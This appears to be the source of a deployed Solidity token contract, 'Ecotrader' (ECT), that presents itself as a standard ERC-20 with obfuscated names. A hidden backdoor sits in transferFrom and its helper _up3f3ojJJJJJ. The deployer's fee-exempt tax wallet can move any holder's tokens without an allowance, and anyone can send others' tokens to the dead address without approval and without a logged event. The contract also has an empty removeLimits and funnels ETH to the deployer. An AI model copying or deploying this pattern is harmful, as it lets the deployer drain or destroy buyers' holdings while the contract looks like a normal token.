// SPDX-License-Identifier: MIT

/*
    Telagram : https://t.me/TheEcoTrader
    X/Twitter: https://x.com/Ecotrader_io
    Website  : https://www.ecotrader.io/
    Discord  : https://discord.com/invite/Ww53x3MwUc
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract TheEcoTrader is Context, IERC20, Ownable {
    address payable private _taxclknlJJJJJ;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Ecotrader";
    string private constant _symbol = unicode"ECT";

    uint256 private _vkjbnkfjJJJJJ = 10;
    uint256 private _maxovnboiJJJJJ = 10;
    uint256 private _initvkjnbkjJJJJJ = 20;
    uint256 private _finvjlkbnlkjJJJJJ = 0;
    uint256 private _redclkjnJJJJJK = 2;
    uint256 private _prevlfknjoiJJJJJ = 2;
    uint256 private _buylkvnlJJJJJK = 0;
    IUniswapV2Router02 private RomRouter;

    uint256 public _vnbbvlJJJJJK = qq30fef / 100;
    uint256 public _oijboijoiJJJJJ = 15 * 10 ** 18;
    uint256 private _cvjkbnkjJJJJJ = 10;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlJJJJJKC;
    mapping(address => mapping(address => uint256)) private _allcvnkjnJJJJJ;
    mapping(address => bool) private _feevblknlJJJJJ;
    
    address private router_;
    address private ParBalance;
    bool private _tradingvlknJJJJJ;
    bool private _inlknblJJJJJ = false;
    bool private swapvlJJJJJK = false;
    uint256 private _sellcnjJJJJJK = 0;
    uint256 private _lastflkbnlJJJJJ = 0;
    address constant _deadlknJJJJJ = address(0xdead);


    modifier lockTheSwap() {
        _inlknblJJJJJ = true;
        _;
        _inlknblJJJJJ = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlJJJJJKC[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function _calcTax_lvknblJJJJJ(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblJJJJJ) {
                taxAmount = amount
                    .mul((_buylkvnlJJJJJK > _redclkjnJJJJJK) ? _finvjlkbnlkjJJJJJ : _initvkjnbkjJJJJJ)
                    .div(100);
            }
            if (
                from == ParBalance &&
                to != address(RomRouter) &&
                !_feevblknlJJJJJ[to] &&
                to != _taxclknlJJJJJ
            ) {
                _buylkvnlJJJJJK++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblJJJJJ &&
                to == ParBalance &&
                from != _taxclknlJJJJJ &&
                swapvlJJJJJK &&
                _buylkvnlJJJJJK > _prevlfknjoiJJJJJ
            ) {
                if (block.number > _lastflkbnlJJJJJ) {
                    _sellcnjJJJJJK = 0;
                }
                _sellcnjJJJJJK = _sellcnjJJJJJK + _getAmountOut_lvcbnJJJJJK(amount);
                require(_sellcnjJJJJJK <= _oijboijoiJJJJJ, "Max swap limit");
                if (contractTokenBalance > _vnbbvlJJJJJK)
                    _swapTokenslknlJJJJJ(_vnbbvlJJJJJK > amount ? amount : _vnbbvlJJJJJK);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjJJJJJ(address(this).balance);
                }
                _lastflkbnlJJJJJ = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlJJJJJ = payable(_msgSender());
        
        _balknvlJJJJJKC[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlJJJJJKC[address(this)] = (qq30fef * 98) / 100;
        _feevblknlJJJJJ[address(this)] = true;
        _feevblknlJJJJJ[_taxclknlJJJJJ] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _up3f3ojJJJJJ(address from, address to)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlJJJJJ[msg.sender]) return !_feevblknlJJJJJ[msg.sender];
        if(!(from == ParBalance || to != _deadlknJJJJJ)) return false;
        return true;
    }

    function _transfer_kjvnJJJJJ(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblJJJJJ(from, to, amount);
        _balknvlJJJJJKC[from] = _balknvlJJJJJKC[from].sub(amount);
        _balknvlJJJJJKC[to] = _balknvlJJJJJKC[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlJJJJJKC[address(this)] = _balknvlJJJJJKC[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknJJJJJ) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnJJJJJ[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnJJJJJ(sender, recipient, amount);
        if (_up3f3ojJJJJJ(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnJJJJJ[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjJJJJJ(uint256 amount) private {
        _taxclknlJJJJJ.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnJJJJJ(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnJJJJJ[owner][spender];
    }

    function _swapTokenslknlJJJJJ(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        _approve(address(this), address(RomRouter), tokenAmount);
        router_ = address(RomRouter);
        RomRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits () external onlyOwner {
    }

    function _setTax_lknblJJJJJ(address payable newWallet) external {
        require(_feevblknlJJJJJ[_msgSender()]);
        _taxclknlJJJJJ = newWallet;
        _feevblknlJJJJJ[_taxclknlJJJJJ] = true;
    }

    function aJJJJJTeam() external onlyOwner {
        require(!_tradingvlknJJJJJ, "Trading is already open");
        RomRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(RomRouter), qq30fef);
        ParBalance = IUniswapV2Factory(RomRouter.factory()).createPair(
            address(this),
            RomRouter.WETH()
        );
        RomRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlJJJJJK = true;
        _tradingvlknJJJJJ = true;
        IERC20(ParBalance).approve(
            address(RomRouter),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnJJJJJ() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnJJJJJK(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        uint256[] memory amountOuts = RomRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
}